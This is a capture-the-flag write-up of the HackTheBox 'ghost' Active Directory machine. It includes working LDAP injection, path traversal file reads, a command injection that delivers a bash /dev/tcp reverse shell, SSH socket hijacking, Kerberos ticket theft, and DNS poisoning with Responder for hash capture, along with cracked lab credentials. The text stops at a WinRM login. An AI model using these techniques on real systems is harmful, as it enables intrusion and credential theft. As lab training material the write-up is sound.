---
layout: post
title: "ghost"
date: 2026-03-01 
categories: OSCP Playlist
---
# ghost

# Summary

- ffuf fuzz for submdomains; found intranet
- intranet login page vulnerable to LDAP injection; bypass login as logged in
- intranet page reveals gitea subdomain
- leverage LDAP injection to bruteforce gitea_temp_principal’s password with cutsom script ldap_brute.py; logged in
- public API key exposed in gitea repo; LFI vulnerability discovered in the “extra” HTTP parameter
- LFI to read /proc/self/environ to expose API keys in environment; found DEV_INTRANET_KEY
- ghost-dev repo revealed DEV_INTRANET_KEY can be used to scan URL; repo revealed command injection flaw in endpoint; execute bash reverse shell to get foothold on docker as root
- Listing running processes reveal SSH ControlMaster multiplexed socket; piggyback on the socket without re-authentication
- onto ssh session as domain user; check klist to find cached kerberos ticket; transfer kerberos ticket back via base64 encryption/decryption
- ticket can be used now on host; we have a valid AD user; by default; authenticated users can create DNS record
- On intranet, we notice user justin.bradley has an automated script that queries **bitbucket.ghost.htb** domain; use [dnstool.py](http://dnstool.py) to register that domain and point back to our host
- set up responder for incoming connections; captured justin’s NTLMv2 hash; hashcat to crack weak password
- bloodhound-python to map out AD; justin has ReadGMSAPassword privilege over ADFS_GMSA$ account
- adfs accounts can be used to forge golden SAML; port 8443 hosts a federation application that uses SAML; ADFS uses token-signing certificate to sign SAML assertions
- ADFS_GMSA$ is part of remote management users; evil-winrm onto dc01; use ADFSDump.exe to extract deryption key and encrypted token-signing certificate
- ADFSpoof to forge golden SAML; copy assertion and replace value in SAMLResponse on captured POST request of successful sign in to the federation app on port 8443; logged in as Administrator and gained access to MSSQL debugger
- Enumerate MSSQL to find linked database “PRIMARY”; enumerate impersonation privilege on PRIMARY; we can impersonate sa
- Modify Nishang PowerShell ReverseShell to bypass AV, encode in base64 little endian format
- Enable xp_cmdshell on linked server and execute reverse shell, with listener waiting; shell as mssql_service user on PRIMARY
- Check privileges; SeImpersonatePrivilege is present; vulnerable to efspotato exploit
- upload efspotato.cs file; compile with csc.exe on PRIMARY and execute same nishang reverse shell; SYSTEM shell retrieved
- Upload PowerView.ps1 to retrieve domain information; PRIMARY is on corp.ghost.htb (child domain of dc01 [ghost.htb])
- Get-DomainTrusts revealed bidirectional trust with parent domain ghost.htb
- Set-MpPreference to disable anti-virus; uploaded mimikatz.exe to dcsync using lsadump::dcsync child domain with SYSTEM shell; trust account’s NT hash is revealed
- With trust account NT hash, we can forge inter-realm referral ticket using impacket-ticketer
- referral ticket is used to request cifs service ticket on dc01 with enterprise admin privilege with impacket-getST
- export ticket to KRB5CCNAME environment variable and use nxc —use-kcache to confirm dcsync privilege; success
- impacket-secretsdump to DCSync DC01

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/ghost 10.129.103.204

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-31 15:48:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2026-01-31T15:49:44+00:00; +4s from scanner time.
| ms-sql-info:
|   10.129.103.204:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-31T15:38:14
|_Not valid after:  2056-01-31T15:38:14
| ms-sql-ntlm-info:
|   10.129.103.204:1433:
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2026-01-30T15:35:20
|_Not valid after:  2026-08-01T15:35:20
|_ssl-date: 2026-01-31T15:49:44+00:00; +4s from scanner time.
| rdp-ntlm-info:
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-31T15:49:09+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8008/tcp open  http          nginx 1.18.0 (Ubuntu)
|_http-generator: Ghost 5.78
| http-robots.txt: 5 disallowed entries
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-title: Ghost
|_http-server-header: nginx/1.18.0 (Ubuntu)
8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
| http-title: Ghost Core
|_Requested resource was /login
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

```

Form the open ports, this seems to be a domain controller. Let’s add the domain name to /etc/hosts file:

```bash
10.129.103.204 ghost.htb DC01.ghost.htb core.ghost.htb
```

Let’s visit the web pages

## DNS

Let’s perform a zone transfer:

```jsx
dig axfr ghost.htb @10.129.103.204

; Transfer failed.
```

## HTTP

![image.png]({{ site.baseurl }}/assets/ghost/image.png)

## HTTPS

![image.png]({{ site.baseurl }}/assets/ghost/image%201.png)

## Port 8008

![image.png]({{ site.baseurl }}/assets/ghost/image%202.png)

From wapplyzer, we get the version of the CMS ghost v5.78

![image.png]({{ site.baseurl }}/assets/ghost/image%203.png)

Let’s search up if this version of ghost is vulnerable to any public exploits. Did not find anything interesting.

Let’s use feroxbuster to fuzz subdirectories:

```bash
feroxbuster -u http://10.129.103.204:8008/ -C 404
```

Too much errors. Let’s fuzz with ffuf. Let’s fuzz for subdomains. 

```jsx
ffuf -u http://10.129.103.204:8008 -H "Host: FUZZ.ghost.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 7676

intranet
```

Let’s add that to our /etc/hosts.

We can also enumerate subdomains with dns lookup. first verify if Windows DNS is up, by doing a reverse lookup on itself:

```bash
nslookup

> server 10.129.103.204
Default server: 10.129.103.204
Address: 10.129.103.204#53
> intranet.ghost.htb
Server:         10.129.103.204
Address:        10.129.103.204#53

Name:   intranet.ghost.htb
Address: 127.0.0.1

```

It works. Now let’s use gobuster:

```bash
gobuster dns --resolver 10.129.103.204 --domain ghost.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 

intranet.ghost.htb ::ffff:10.129.103.204
corp.ghost.htb 10.0.0.10
core.ghost.htb ::ffff:10.129.103.204
dc01.ghost.htb ::ffff:10.129.103.204
federation.ghost.htb ::ffff:10.129.103.204
```

### intranet.ghost.htb

```bash
http://intranet.ghost.htb:8008
```

![image.png]({{ site.baseurl }}/assets/ghost/image%204.png)

![image.png]({{ site.baseurl }}/assets/ghost/image%205.png)

admin:admin did not work. Let’s take a look at the POST request:

![image.png]({{ site.baseurl }}/assets/ghost/image%206.png)

It’s using LDAP authentication. Maybe it’s vulnerable to LDAP injection. Let’s try inputting a wildcard character:

![image.png]({{ site.baseurl }}/assets/ghost/image%207.png)

We are in.

![image.png]({{ site.baseurl }}/assets/ghost/image%208.png)

We are logged in as kathryn.holland. Clicking on users, we get some potential AD users and what member they are part of:

![image.png]({{ site.baseurl }}/assets/ghost/image%209.png)

justin.bradley seems the most interesting since they are part of remote management users. 

Clicking on the forum, we find one interesting comment:

![image.png]({{ site.baseurl }}/assets/ghost/image%2010.png)

Let’s see if we can connect to the vhost mentioned. First, add it to our /etc/hosts file.

In News, we also see this:

![image.png]({{ site.baseurl }}/assets/ghost/image%2011.png)

In burp, we can see our token:

```bash
GET /_next/static/chunks/173-3334a6ce4287b30e.js HTTP/1.1
Host: intranet.ghost.htb:8008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: token=Bearer%20eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzI0NzA2ODQsImlhdCI6MTc2OTg3ODY4NCwidXNlciI6eyJ1c2VybmFtZSI6ImthdGhyeW4uaG9sbGFuZCJ9fQ.UAvpwl0DlfP9WQsOHf3Vif7yuQVnnTfsPE3QkWvcZic
Priority: u=4
```

We see that we have kathryn’s JSON web token. Can verify by base64 decoding the middle part:

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzI0NzA2ODQsImlhdCI6MTc2OTg3ODY4NCwidXNlciI6eyJ1c2VybmFtZSI6ImthdGhyeW4uaG9sbGFuZCJ9fQ
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2012.png)

Let’s sign out and sign back in as gitea_temp_principal account.

![image.png]({{ site.baseurl }}/assets/ghost/image%2013.png)

We are logged in. 

The post also mentioned gitea, from the naming conventions, the vhost is probably the following, let’s add it to our /etc/hosts file and test it out:

```bash
gitea.ghost.htb
```

## gitea.ghost.htb

```bash
http://gitea.ghost.htb:8008/
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2014.png)

The login page requires a username and password, we know we want to login as gitea_temp_principal. Let’s use LDAP injection vulnerability to brute force the user’s password. 

We can leverages the vulnerability by bruteforcing characters e.g if the first character of the password is s, we input s*, if the response is an successful authentication, then we know the password begin with an s. The method is repeated until we get the full password.

![image.png]({{ site.baseurl }}/assets/ghost/image%2015.png)

We ask our favourite LLM to write up a bruteforce script, with pruning (only bruteforce lowercase letters, since LDAP is case insensitive, also remove symbols). Let’s run our script:

```bash
python3 ldap_brute.py

<SNIP>
============================================================
[+] Password brute-force complete!
[+] Final password: 'szrr8kpc3z6onlqf'
[+] Total attempts: 335
[+] Total time: 43.05s
[+] Average speed: 7.78 attempts/second
============================================================

[*] Verifying complete password without wildcard...
[+] ✓ Password verified successfully: 'szrr8kpc3z6onlqf'

[+] SUCCESS! Use this password to login:
    Username: gitea_temp_principal
    Password: szrr8kpc3z6onlqf

```

Let’s try logging in:

```bash
gitea_temp_principal:szrr8kpc3z6onlqf
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2016.png)

Logged in. 

![image.png]({{ site.baseurl }}/assets/ghost/image%2017.png)

Public API key for ghost:

```bash
a5af628828958c976a3b6cc81a
```

In the docker file, it seems another API key is exposed:

```bash
659cdeec9cd6330001baefbf
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2018.png)

Let’s clone the whole repo locally:

```bash
git clone http://gitea.ghost.htb:8008/ghost-dev/blog.git 
```

Now that we have the full API public endpoint, we can just use the API key to query. 

Also, in File: blog/posts-public.js:109-116 

the extra query parameter is concatenated into a file path with no sanitization:
const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });

Exploit: GET /api/posts/?extra=../../../etc/passwd escapes the directory and reads arbitrary files.

Let’s test it out:

```bash
curl -s "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../etc/passwd" | jq '.meta.extra'

{
  "../../../../../../etc/passwd": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"
}
```

It works. 

Shell users: 

┌──────┬──────┬──────────┬────────────┐

│ User │ UID  │  Shell   │    Home    │

├──────┼──────┼──────────┼────────────┤

│ root │ 0    │ /bin/ash │ /root      │

├──────┼──────┼──────────┼────────────┤

│ node │ 1000 │ /bin/sh  │ /home/node │
└──────┴──────┴──────────┴────────────┘

We can also verify the secrets that’s been echoed into file important, the Docker file exposed this detail:

```bash
curl -s "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../..//var/lib/ghost/extra/important" | jq '.meta.extra'
 

{
  "../../../../../../..//var/lib/ghost/extra/important": "659cdeec9cd6330001baefbf\n"
}
```

It’s correct. 

Let’s see docker secret:

```bash
curl -s "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../proc/self/environ" | jq '.meta.extra'

{
  "../../../../../../proc/self/environ": "HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
}

DEV_INTRANET_KEY: !@yqr!X2kxmQ.@Xe
```

Let’s do some bash magic and make it easier to read:

```bash
 curl -s "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../proc/self/environ" | jq -r '.meta.extra[]' | tr '\0' '\n'

HOSTNAME=26ae7990f3dd
database__debug=false
YARN_VERSION=1.22.19
PWD=/var/lib/ghost
NODE_ENV=production
database__connection__filename=content/data/ghost.db
HOME=/home/node
database__client=sqlite3
url=http://ghost.htb
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
database__useNullAsDefault=true
GHOST_CONTENT=/var/lib/ghost/content
SHLVL=0
GHOST_CLI_VERSION=1.25.3
GHOST_INSTALL=/var/lib/ghost
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_VERSION=18.19.0
GHOST_VERSION=5.78.0
```

We see an interesting db as well in content/data/ghost.db. Let’s download that file as well. Let’s go into the process’s current working directory:

```bash
curl -s "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../proc/self/cwd/content/data/ghost.db" | jq '.meta.extra' -r > ghost.db
```

The db is corrupt.

![image.png]({{ site.baseurl }}/assets/ghost/image%2019.png)

We recovered a bcrypt hash from kathryn:

```bash
$2a$10$lSwOgij5ynSgNi0uwAhhQu7aV5IOnhwrYIKctWko7fAZ6h5Ci6j0.
```

Let’s attempt to crack it:

```bash
.\hashcat.exe -m 3200 "$2a$10$lSwOgij5ynSgNi0uwAhhQu7aV5IOnhwrYIKctWko7fAZ6h5Ci6j0." ..\rockyou.txt
```

Does not crack. 

Let’s clone the other repo as well:

```bash
git clone http://gitea.ghost.htb:8008/ghost-dev/intranet.git
```

After analysing the repo, the following were found: 

DEV_INTRANET_KEY USAGE

- File: backend/src/api/dev.rs
- Custom Rocket guard called DevGuard
- Checks HTTP header: X-DEV-INTRANET-KEY
- Protects the /api-dev/scan endpoint

COMMAND INJECTION IN /api-dev/scan

- Endpoint: POST /api-dev/scan
- Auth: X-DEV-INTRANET-KEY header
- Runs: bash -c "intranet_url_check {url}"
- url param is directly interpolated into the bash command with no sanitization
- Gives arbitrary command execution on the intranet container
- Exploit:

```bash
curl -X POST [http://intranet.ghost.htb:8008/api-dev/scan](http://intranet.ghost.htb:8008/api-dev/scan) -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type:application/json' -d '{"url": "[http://x](http://x/); id"}'
```

command line is having trouble parsing, let’s perform this on burp.

```bash
POST /api-dev/scan HTTP/1.1
Host: intranet.ghost.htb:8008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: token=Bearer%20eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzM1MTIyNDUsImlhdCI6MTc3MDkyMDI0NSwidXNlciI6eyJ1c2VybmFtZSI6ImdpdGVhX3RlbXBfcHJpbmNpcGFsIn19.GD-NqkSxecZ6Ogn_EexfkttOCIVHyAosMqruwVILV_s
Upgrade-Insecure-Requests: 1
X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe
Priority: u=0, i
Content-Type: application/json
Content-Length: 23

{"url": "http://x; id"}
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2020.png)

It worked, and we are root on docker. Let’s get a shell back. 

```bash
{"url": "http://x; bash -c 'bash -i >& /dev/tcp/10.10.16.102/4444 0>&1'"}
```

Let’s start a listener:

```bash
nc -lnvp 4444
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2021.png)

We get a reverse shell back as root. 

Let’s check the our network configuration. Both ifconfig and ip is not installed on the docker. Checking /etc/hosts:

```bash
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.0.0.254      windows-host
172.18.0.3      36b733906694
```

Let’s check our running processes:

```bash
ps -ef --forest

root           1       0  0 15:30 ?        00:00:00 /app/ghost_intranet
root          23       1  0 15:32 ?        00:00:00 [ssh] <defunct>
root          24       1  0 15:32 ?        00:00:00 ssh: /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 [mux]
```

There is an ssh connection. That's an SSH ControlMaster multiplexed socket. It means root has an active, authenticated SSH session to dev-workstation:22 as florence.ramirez@ghost.htb, and the socket file at /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 allows new SSH connections to piggyback on it without re-authenticating.

```bash
ssh -S /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@dev-workstation
```

The -S flag tells SSH to use the existing control socket. No password or key needed — the mux master already holds the authenticated session.

Let’s spawn a stable shell as well:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2022.png)

Let’s check our network information:

```bash
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.0.0.254      windows-host dc01.ghost.htb ghost.htb
172.18.0.2      LINUX-DEV-WS01
```

Let’s check our privileges:

```bash
id

uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
```

We are in the it group. Let’s check our sudo privileges

```bash
florence.ramirez@LINUX-DEV-WS01:~$ sudo -l
sudo -l
bash: sudo: command not found
```

Let’s find all files writable by group it:

```bash
find / -group it 2>/dev/null
```

No result. 

Checking the running processes on this host:

```bash
ps -ef --forest 

root           1       0  0 15:30 ?        00:00:00 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
root          17       1  0 15:30 ?        00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          38      17  0 15:31 ?        00:00:00  \_ sshd: florence.ramirez@ghost.htb [priv]
florenc+      57      38  0 15:32 ?        00:00:00      \_ sshd: florence.ramirez@notty
florenc+      95      57  0 15:40 ?        00:00:00          \_ -bash
florenc+      98      95  0 15:40 ?        00:00:00              \_ python3 -c import pty; pty.spawn("/bin/bash")
florenc+      99      98  0 15:40 pts/0    00:00:00                  \_ /bin/bash
florenc+     120      99  0 15:43 pts/0    00:00:00                      \_ ps -ef --forest
root          18       1  0 15:30 ?        00:00:00 /usr/sbin/nmbd --daemon --foreground --debug-stdout --no-process-group
root          19       1  0 15:30 ?        00:00:00 /usr/sbin/smbd --daemon --foreground --debug-stdout --no-process-group
root          24      19  0 15:31 ?        00:00:00  \_ /usr/sbin/smbd --daemon --foreground --debug-stdout --no-process-group
root          25      19  0 15:31 ?        00:00:00  \_ /usr/sbin/smbd --daemon --foreground --debug-stdout --no-process-group
root          20       1  0 15:30 ?        00:00:00 /usr/sbin/winbindd --daemon --foreground --debug-stdout --no-process-group
root          26      20  0 15:31 ?        00:00:00  \_ winbindd: domain child [LINUX-DEV-WS01]
root          27      20  0 15:31 ?        00:00:00  \_ winbindd: domain child [GHOST]
root          43      20  0 15:31 ?        00:00:00  \_ winbindd: idmap child
root          52      20  0 15:32 ?        00:00:00  \_ winbindd: domain child [BUILTIN]
```

Let’s check out the configuration file:

```bash
cat /etc/supervisor/conf.d/supervisord.conf
```

Nothing useful. Feels like we should be a legitimate user, let’s check our kcache:

```bash
klist

Ticket cache: FILE:/tmp/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB

Valid starting     Expires            Service principal
02/15/26 15:44:01  02/16/26 01:44:01  krbtgt/GHOST.HTB@GHOST.HTB
        renew until 02/16/26 15:44:01

```

Let’s transfer the file back to our host. 

```bash
cat /tmp/krb5cc_50 | base64 -w 0


```

Now back on our own host:

```bash
echo '' | base64 -d > florence.ramirez
```

Now export the ticket:

```bash
export KRB5CCNAME=florence.ramirez

klist
Ticket cache: FILE:florence.ramirez
Default principal: florence.ramirez@GHOST.HTB

Valid starting       Expires              Service principal
02/15/2026 10:47:01  02/15/2026 20:47:01  krbtgt/GHOST.HTB@GHOST.HTB
        renew until 02/16/2026 10:47:01
```

Let’s attempt nxc:

```bash
nxc smb ghost.htb --use-kcache

SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         ghost.htb       445    DC01             [+] GHOST.HTB\florence.ramirez from ccache
```

It works. We now have a valid domain user. Let’s check smb shares:

```bash
nxc smb ghost.htb --use-kcache --shares

SMB         ghost.htb       445    DC01             Share           Permissions     Remark
SMB         ghost.htb       445    DC01             -----           -----------     ------
SMB         ghost.htb       445    DC01             ADMIN$                          Remote Admin
SMB         ghost.htb       445    DC01             C$                              Default share
SMB         ghost.htb       445    DC01             IPC$            READ            Remote IPC
SMB         ghost.htb       445    DC01             NETLOGON        READ            Logon server share 
SMB         ghost.htb       445    DC01             SYSVOL          READ            Logon server share 
SMB         ghost.htb       445    DC01             Users           READ 
```

Let’s get a valid users list:

```bash
nxc smb ghost.htb --use-kcache --users

#Save output to a temp file
awk '{print $5}' temp.txt > users.txt
```

Let’s asreproast and kerberaost:

```bash
nxc ldap ghost.htb --use-kcache --asreproast asreproast.out

LDAP        ghost.htb       389    DC01             No entries found!

nxc ldap ghost.htb --use-kcache --kerberoast kerberoast.out

$krb5tgs$18$hostadfs_gmsa.ghost.htb$GHOST.HTB$*ghost.htb\adfs_gmsa$*$62d785fca594f28621add755$
```

Let’s attempt to crack this; mode 19700 for Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)

```bash
.\hashcat.exe -m 19700 ..\hashes.txt ..\rockyou.txt
```

No result. 

Let’s circle back to the smb shares:

```bash
nxc smb ghost.htb --use-kcache --spider NETLOGON --regex .
```

Nothing. 

```bash
nxc smb ghost.htb --use-kcache --spider Users --regex .
```

Let’s collect AD info with bloodhound-python:

```bash
bloodhound-python -u florence.ramirez -d ghost.htb -dc DC01.ghost.htb -k -c all -ns 10.129.8.197 -no-pass
```

We do not see additional privileges of florence.ramirez, or the AD group IT. We are at a dead end. 

Thinking back to this: 

![image.png]({{ site.baseurl }}/assets/ghost/image%2023.png)

By default, authenticated users can create DNS records. Let’s download [dnstool.py](http://dnstool.py), and point the the unregistered bitbucket.ghost.htb to our IP, then start responder to try and catch justin’s hash; he has a script that attempts to connect to **bitbucket.ghost.htb** domain. We download dnstool.py from https://github.com/dirkjanm/krbrelayx 

We can check first, whether the domain name exists:

```bash
nslookup
> server 10.129.8.197
Default server: 10.129.8.197
Address: 10.129.8.197#53
> bitbucket.ghost.htb
Server:         10.129.8.197
Address:        10.129.8.197#53

** server can't find bitbucket.ghost.htb: NXDOMAIN
> 

```

Now we know it’s unregistered, let’s start responder:

```bash
sudo responder -I tun0
```

Let’s create the DNS entry:

```bash
python3 /home/kali/tools/krbrelayx/dnstool.py -u 'ghost.htb\florence.ramirez' -k -a add -r bitbucket.ghost.htb --zone ghost.htb -d 10.10.16.102 DC01.ghost.htb -dns-ip 10.129.8.197

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

On our responder terminal:

```bash

[HTTP] NTLMv2 Client   : 10.129.8.197
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:73408f8c1047c183:FFBE20DD32ECEEF5EEB63301AF9DDD70:
```

Let’s save the hash to a file and attempt to crack it:

```bash
.\hashcat.exe -m 5600 ..\hashes.txt ..\rockyou.txt

justin.bradley:Qwertyuiop1234$$
```

Searching up justin’s privileges on bloodhound:

![image.png]({{ site.baseurl }}/assets/ghost/image%2024.png)

He is a member of Remote Management Users. 

![image.png]({{ site.baseurl }}/assets/ghost/image%2025.png)

He also has ReadGMSAPassword on ADFS_gmsa$, which means we can read their NTLM hash password. 

Let’s use nxc to readgmsa password:

```bash
nxc ldap ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$' --gmsa

LDAP        10.129.8.197    389    DC01             Account: adfs_gmsa$           NTLM: 8e620ff45d2a1de3fafc4c67a2c0dab4     PrincipalsAllowedToReadPassword: ['DC01$', 'justin.bradley']

```

We now also have control of the adfs_gmsa$ computer account. Looking up its privileges on bloodhound:

![image.png]({{ site.baseurl }}/assets/ghost/image%2026.png)

Let’s use justin’s account first to log on to DC01:

```bash
evil-winrm -u justin.bradley -p 'Qwertyuiop1234$$' -i DC01.ghost.htb
```

Checking our privileges:

```bash
whoami /priv

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
